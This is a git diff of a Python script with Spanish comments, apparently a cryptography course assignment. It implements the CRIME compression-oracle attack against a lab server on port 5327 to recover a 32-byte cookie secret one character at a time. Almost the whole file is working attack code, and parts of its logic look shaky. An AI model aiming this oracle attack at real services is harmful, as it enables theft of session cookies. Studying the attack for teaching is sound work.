@@ -1,58 +1,69 @@
 # Implementación del ataque CRIME, la que ocurre al utilizar cifrado 
 # y compresión al mismo tiempo y que permite exfiltrar información 
-# sin conocer la llave de cifrado
+# sin conocer la llave de cifrado.
+
+# Aquí se muestran las funciones programadas, pero no se ejecutan 
+# formalmente. Para efectuar el ataque, es necesario que se ejecute
+# el programa Client.py que contiene la conexión necesaria al servidor
+# y las funciones descritas a continuación.
 
 import random
 import gzip
+import socket
 import os
+import sys
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding 
 
 W = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-KNOWN = 'Cookie: secret='      # porción del texto adyascente al secreto
-SECRET = ''     # secreto que queremos encontrar
-
-X = ''                                  # bytearray o string
-GZIP_X = gzip.compress(X.encode())      # gzip de X
+NO_W = '#$&![]/'    # conjunto de caracteres que no están en w
 key = os.urandom(16)  
-iv = os.urandom(16)   
+iv = os.urandom(16)  
+IKNOW = 'Cookie: secret='
+CONNECTION_ADDR = (sys.argv[1], 5327)
 
-def encrypt_aes_cbc(msj):           
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-    encryptor = cipher.encryptor() 
-    padder = padding.PKCS7(algorithms.AES.block_size).padder()
-    t_padded = padder.update(msj) + padder.finalize()
-    ENCRYPT_X = encryptor.update(t_padded) + encryptor.finalize()   
-    return ENCRYPT_X
+# La función COMPRESSION_ORACLE es la encargada de enviar un mensaje
+# al servidor y recibir la respuesta. 
+def COMPRESSION_ORACLE(MSJ):
+    # nos conectamos con el socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(CONNECTION_ADDR)
+    
+    # enviamos el mensaje para su compresión
+    s.sendall(MSJ.encode())
+    # recibimos lo entregado por el servidor
+    data = s.recv(4096)
+    s.close()
+    return len(data)
 
+# La función ALGORITHM es la encargada de efectuar el ataque e imprimir
+# los logs solicitados en la pregunta P2.
 
-def COMPRESSION_ORACLE(DATA):
-    return len(encrypt_aes_cbc(gzip.compress(DATA.encode())))
+def ALGORITHM(KNOWN):
+    # computamos el padding para el mensaje con el NO_W
+    PADDING = COMPUTE_PADDING(KNOWN + NO_W)
+    POSSIBLE = []       # arreglo vacío con todas las respuestas posibles
+    
+    for c in W:         # recorremos todos los caracteres de w
+        print("-----------------------------------------------------")
+        BASE_MSJ = PADDING + KNOWN + NO_W + c
+        BASE_LENGTH = COMPRESSION_ORACLE(BASE_MSJ)
+        print("Texto BASE en request enviada = {}".format(BASE_MSJ))
+        print("Largo de texto BASE en request = {}".format(BASE_LENGTH))
+        
+        C_MSJ = PADDING + KNOWN + c + NO_W
+        C_LENGTH = COMPRESSION_ORACLE(C_MSJ)
+        print("Texto C en request enviada = {}".format(C_MSJ))
+        print("Largo de texto C en request = {}".format(C_LENGTH))
+        print("-----------------------------------------------------")
 
-
-def ALGORITHM(DATA):
-    POSSIBLE = []   # arreglo vacío con todas las respuestas posibles
-    y = '#$&!°'          # y es el conjunto de 5 a 10 carácteres fuera de w
-    # UNCOMPRESSED_LENGTH = COMPRESSION_ORACLE(KNOWN + y)
-    NO_W = '#$&!°'       # conjunto de caracteres que no están en w
-    for c in W:     # recorremos todos los caracteres de w
-        BASE_LENGTH = COMPRESSION_ORACLE(KNOWN + NO_W + c)
-        C_LENGTH = COMPRESSION_ORACLE(KNOWN + c + NO_W)
         if C_LENGTH < BASE_LENGTH:
             POSSIBLE.append(c)
+    return POSSIBLE
 
-    # RESPONSES contendrá todas las posibles soluciones para SECRET,
-    # justo después de KNOWN
-    RESPONSES = []
-    if POSSIBLE != []:
-        for p in POSSIBLE:
-            RESPONSES += ALGORITHM(KNOWN + p)
-
-    print(RESPONSES)
-    return RESPONSES
-
-
+# La función COMPUTE_PADDING es la encargada de computar el padding
+# necesario para un mensaje KNOWN.
 def COMPUTE_PADDING(KNOWN):
     # computamos un padding para que el largo calce con el largo del bloque
     BASE_LENGTH = COMPRESSION_ORACLE(KNOWN)
@@ -62,19 +73,22 @@ def COMPUTE_PADDING(KNOWN):
         NEW_LENGTH = COMPRESSION_ORACLE(BASURA + KNOWN)
         if NEW_LENGTH <= BASE_LENGTH:
             BASURA += random.choice(W)
-
-    KNOWN = BASURA + KNOWN
     return BASURA[:-1]
 
+# la función CRIME es la encargada de efectuar el ataque como tal, la cuál
+# se ejecuta de forma secuencial hasta encontrar el secreto de largo 32 bytes.
+def CRIME_ATTACK(IKNOW):
+    # computamos la respuesta por primera vez con lo que sabemos
+    RESPONSE = ALGORITHM(IKNOW)
 
-def CRIME_ATTACK(MSJ):
-    # computamos el padding
-    PADDING = COMPUTE_PADDING(MSJ)
-    # computamos la respuesta
-    RESPONSE = ALGORITHM(PADDING)
-    
-    for r in RESPONSE:
-        SECRET += r[-1]
-        
-    print("[CRIME RESPONSE] \"{}\"".format(SECRET))
-    return SECRET
+    left = 32
+    while left > 0:
+        POSSIBLES = []
+        for p in RESPONSE:
+            POSSIBLE = ALGORITHM(IKNOW + p)
+            for j in POSSIBLE:
+                POSSIBLES.append(p+j)
+        RESPONSE = POSSIBLES
+        left -= 1
+        print("Lista de posibles valores de SECRET = {}". format(RESPONSE))
+    return "".join(RESPONSE)
